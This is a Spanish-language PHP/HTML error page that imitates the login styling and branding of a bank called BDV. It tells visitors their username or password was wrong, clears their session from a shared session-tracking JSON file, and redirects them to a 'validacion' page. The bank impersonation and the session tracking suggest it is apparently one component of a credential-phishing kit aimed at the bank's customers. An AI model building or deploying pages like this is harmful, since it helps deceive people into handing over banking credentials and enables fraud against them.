<?php
// error.php
// Maneja el error de forma dinámica, destruye la sesión y usa el estilo del login principal.

// 1. INICIO Y DESTRUCCIÓN DE SESIÓN
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Para limpiar la sesión del usuario si existe
if (session_id()) {
    $sessionsFile = 'data/sessions_status.json';
    $sessions = file_exists($sessionsFile) ? json_decode(file_get_contents($sessionsFile), true) : [];
    
    // Elimina la sesión de la lista si existe
    if (isset($sessions[session_id()])) {
        unset($sessions[session_id()]);
        file_put_contents($sessionsFile, json_encode($sessions));
    }
    
    session_unset();
    session_destroy();
}


// 2. LÓGICA DE MENSAJES
$reason = isset($_GET['reason']) ? strtoupper($_GET['reason']) : 'GENERICO';

// Título general del mensaje
$titulo = "Autenticación incorrecta";

// Color de la Marca BDV para el Título
$titulo_color = '#0067b1'; 

// Color ROJO fuerte para el Mensaje de Error
$error_color = '#dc3545'; 

if ($reason === 'USUARIO') {
    $mensaje_principal = "Usuario inválido o incorrecto. Verifique sus datos.";
} elseif ($reason === 'CLAVE') {
    $mensaje_principal = "Contraseña incorrecta. Verifique la clave.";
} else {
    $mensaje_principal = "Usuario o contraseña inválida.";
}
// NOTA: El título siempre será "Autenticación incorrecta" y el color del mensaje será siempre ROJO.

?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>BDVSOLICITUDES - Error</title>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="icon" href="favicon.png" type="image/x-icon">
    
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(background.webp);
        background-size: cover;
        background-position: center;
      }

      .container {
        display: flex;
        height: 100%;
        width: 80%;
      }

      .left-side {
        width: 40%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right-side {
        width: 30%;
      }

      .form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
      }

      @media (max-width: 768px) {
        body {
          background: #ededed;
        }
        .container {
          flex-direction: column;
        }
        .left-side {
          width: 100%;
          height: 100vh;
        }
        .right-side {
          display: none;
        }
      }

      .form-group {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group input:focus {
        border: 0;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }

      /* Botones CONTINUAR y CANCELAR */
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 10px 20px;
        text-align: center;
        display: inline-block;
        cursor: pointer;
        transition: background-color 0.3s;
        font-size: 16px;
      }

      button:disabled {
        background-color: #E0E0E0;
        cursor: not-allowed;
      }

      .button-container {
        display: flex;
        justify-content: center;
        gap: 10px;
        margin-top: 20px;
        margin-bottom: 20px;
      }

      .cancel-btn {
        background-color: #0067b1;
      }

      .form-group2 {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group2 label {
        position: absolute;
        top: 50%;
        left: 23%;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group2 input {
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }

      .form-group2 input:focus {
        border: 0;
      }

      .form-group2 input:focus + label,
      .form-group2 input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }

      .overlay {
        display: none;
        justify-content: center;
        align-items: center;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 9999;
      }

      .content {
        background-color: #fff;
        width: 350px;
        border-radius: 5px;
        text-align: center;
      }

      /* Estilo del botón ENTRAR */
      #entrarBtn {
        width: 180px; 
        height: 38px;
        padding: 0;
        font-size: 16px;
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        cursor: pointer;
        border: none;
        transition: background-color 0.3s;
      }


      #entrarBtn:disabled {
        background-color: #E0E0E0;
        cursor: not-allowed;
      }

      /* Estilo del texto debajo del botón - MEJORA PARA QUE SE VEA MÁS DE ERROR */
      .texto-rojo {
        color: #dc3545; /* Rojo fuerte */
        font-size: 16px; /* Hacemos la fuente un poco más grande */
        margin-top: 15px;
        margin-bottom: 10px;
        text-align: center;
        font-weight: bold; 
        margin-left: 20px; 
        margin-right: 20px;
      }

      /* Estilo para el mensaje de redirección en error.php */
      .redirect-msg {
          font-size: 12px;
          color: #707070;
          margin-top: 15px;
          margin-bottom: 20px;
      }
    </style>
    </head>
  <body>
    <div class="container">
      <div class="left-side">
        <div class="form">
          <div style="text-align: center">
            <img src="logo.png" alt="" style="width: 90%; margin-top: 20px" />
          </div>
          <div style="width: 100%; text-align: center">
            
            <h4 style="color: <?php echo $titulo_color; ?>; margin-top: 20px; margin-bottom: 5px;"><?php echo $titulo; ?></h4>
            
            <div class="texto-rojo">
              <?php echo $mensaje_principal; ?>
            </div>
            
            <div class="redirect-msg" id="countdown">
                Redirigiendo a la página principal en 10 segundos...
            </div>
            
            <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #707070; margin-top: 30px; margin-bottom: 30px;">
                <br />
            </div>
          </div>
        </div>
      </div>
      <div class="right-side"></div>
    </div>

    <script>
        let tiempoRestante = 10;
        const contador = document.getElementById('countdown');

        function actualizarContador() {
            contador.textContent = `Redirigiendo a la página principal en ${tiempoRestante} segundos...`;
            tiempoRestante--;

            if (tiempoRestante < 0) {
                // Redirige al login principal
                window.location.href = 'validacion.html'; 
            }
        }

        setInterval(actualizarContador, 1000);
    </script>
  </body>
</html>